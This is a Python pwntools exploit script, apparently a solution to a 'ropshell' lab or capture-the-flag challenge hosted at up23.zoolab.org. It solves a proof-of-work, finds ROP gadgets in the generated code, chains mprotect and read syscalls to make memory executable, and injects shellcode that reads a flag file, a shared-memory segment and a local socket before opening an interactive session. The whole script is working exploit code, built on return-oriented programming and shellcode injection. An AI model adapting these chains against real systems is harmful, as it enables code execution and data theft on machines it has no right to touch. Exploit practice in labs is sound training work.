#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64
import hashlib
import sys
import ctypes

from pwn import *

def solve(r):
    prefix=r.recvline().decode().split('\'')[1]
    for i in range(1000000000000):
        h=hashlib.sha1((prefix+str(i)).encode()).hexdigest();
        if(h[:6]=='000000'):
            ans=str(i).encode()
            break;
    print(time.time())
    r.sendlineafter(b'string S: ',base64.b64encode(ans));

def upload(fn):
    r.recvuntil(b'finish the transmission.\n\n');
    with open(fn, 'rb') as f: z = f.read();
    print("\x1b[1;32m** local md5({}): {}\x1b[m".format(fn, hashlib.md5(z).hexdigest()));
    z = base64.b64encode(z);
    for i in range(0, len(z), 768):
        r.sendline(z[i:i+768]);
    r.sendline(b'EOF');
    while True:
        z = r.recvline();
        if b'md5' in z:
            print(z.decode().strip());

def gadget(base,code,tar):
    assert code.find(asm(tar))!= -1, (tar, asm(tar).hex())
    ret = base+code.find(asm(tar))
    log.info(f"Found {hex(ret)}: '{tar}'")
    return ret

def send_rop(r,lst):
    msg = b''
    for l in lst:
        msg += p64(l)
    r.sendline(msg)

def main():
    context.arch = 'amd64'
    context.os = 'linux'
    r = None
    if 'qemu' in sys.argv[1:]:
        r = process("qemu-x86_64-static ./ropshell", shell=True)
    elif 'bin' in sys.argv[1:]:
        r = process("./ropshell", shell=False)
    elif 'local' in sys.argv[1:]:
        r = remote("localhost", 10494)
    else:
        r = remote("up23.zoolab.org", 10494)
    if type(r) != pwnlib.tubes.process.process:
        solve(r)
    r.recvuntil(b"Timestamp is ")
    timestamp = r.recvline().decode().strip()
    r.recvuntil(b"Random bytes generated at ")
    base = int(r.recvline().decode().strip(),16)

    log.info(f"{timestamp=}")
    log.info(f"{base=}, {hex(base)}")

    code = os.popen(f"./codegen {timestamp}").read()
    code = bytearray.fromhex(code)

    rax = gadget(base,code,"pop rax;ret")
    rdx = gadget(base,code,"pop rdx;ret")
    rdi = gadget(base,code,"pop rdi;ret")
    rsi = gadget(base,code,"pop rsi;ret")
    syscall = gadget(base,code,"syscall;ret")

    print(r.recvline().decode().strip())
    print(r.recvline().decode().strip())

    send_rop(r,[
        rax,60,rdi,37,syscall,
    ])
    print(r.recvline().decode().strip())
    print(r.recvline().decode().strip())
    print(r.recvline().decode().strip())

    file_flag=asm(f"\
    mov rax,2;mov rdi,{base};mov rsi,0;syscall;\
    mov rdi,rax;mov rax,0;mov rsi,{base+0x200};mov rdx,0x100;syscall;\
    mov rdx,rax;mov rax,1;mov rdi,1;mov rsi,{base+0x200};syscall;\
    mov rax,60;mov rdi,69;syscall;\
    ")
    send_rop(r,[
        rax,10,rdi,base,rsi,10*0x10000,rdx,7,syscall,
        rax,0,rdi,0,rsi,base+0x0000,rdx,20,syscall,
        rax,0,rdi,0,rsi,base+0x0100,rdx,len(file_flag),syscall,
        base+0x0100,
    ])
    sleep(0.1)
    r.sendline(b"/FLAG\x00")
    sleep(0.1)
    r.send(file_flag)
    print(r.recvline().decode().strip())
    print(r.recvline().decode().strip())
    print(r.recvline().decode().strip())
    print(r.recvline().decode().strip())

    shm_flag=asm(f"\
    mov rax,29;mov rdi,0x1337;mov rsi,0;mov rdx,4096;syscall;\
    mov rdi,rax;mov rax,30;mov rsi,0;mov rdx,4096;syscall;\
    mov rsi,rax;mov rax,1;mov rdi,1;mov rdx,0x80;syscall;\
    mov rdi,87;mov rax,60;syscall;\
    ")
    send_rop(r,[
        rax,10,rdi,base,rsi,10*0x10000,rdx,7,syscall,
        rax,0,rdi,0,rsi,base+0x0800,rdx,len(shm_flag),syscall,
        base+0x0800,
    ])
    sleep(0.1)
    r.send(shm_flag)
    print(r.recvline().decode().strip())
    flag=r.recvuntil(b'** CMD:')[:-7].rstrip(b'\x00').decode()
    print(flag)
    print('** CMD:',r.recvline().decode().strip())
    print(r.recvline().decode().strip())

    connect=shellcraft.amd64.linux.connect('localhost',0x1337,'ipv4')
    net_flag=asm(f"{connect}\
    mov rdi,rbp;mov rax,0;mov rsi,{base+0x1200};mov rdx,0x100;syscall;\
    mov rdx,rax;mov rax,1;mov rdi,1;mov rsi,{base+0x1200};syscall;\
    mov rdi,rax;mov rax,60;syscall;\
    ")
    send_rop(r,[
        rax,10,rdi,base,rsi,10*0x10000,rdx,7,syscall,
        rax,0,rdi,0,rsi,base+0x1000,rdx,len(net_flag),syscall,
        base+0x1000,
    ])
    sleep(0.1)
    r.send(net_flag)

    print(r.recvline().decode().strip())
    print(r.recvline().decode().strip())
    print(r.recvline().decode().strip())
    print(r.recvline().decode().strip())

    r.interactive()
    return

if __name__ == '__main__':
    main()
